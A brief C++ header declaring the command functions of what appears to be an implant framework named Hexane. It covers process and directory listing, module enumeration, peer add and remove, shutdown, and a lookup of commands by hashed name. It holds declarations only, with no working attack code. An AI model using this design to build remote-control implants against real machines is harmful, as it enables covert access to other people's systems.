#ifndef HEXANE_CORELIB_COMMANDS_HPP
#define HEXANE_CORELIB_COMMANDS_HPP
#include <core/corelib.hpp>
#include <core/dotnet.hpp>

namespace Commands {
    VOID
    FUNCTION
        ProcessList();

    VOID
    FUNCTION
        DirectoryList(PARSER *parser);

    VOID
    FUNCTION
        ProcessModules(PARSER *parser);

    VOID
    FUNCTION
        CommandAddPeer(PARSER *parser);

    VOID
    FUNCTION
        CommandRemovePeer(PARSER *parser);

    VOID
    FUNCTION
        Shutdown(PARSER *parser);

    UINT_PTR
    FUNCTION
        FindCommandAddress(UINT32 name);
}

#endif //HEXANE_CORELIB_COMMANDS_HPP
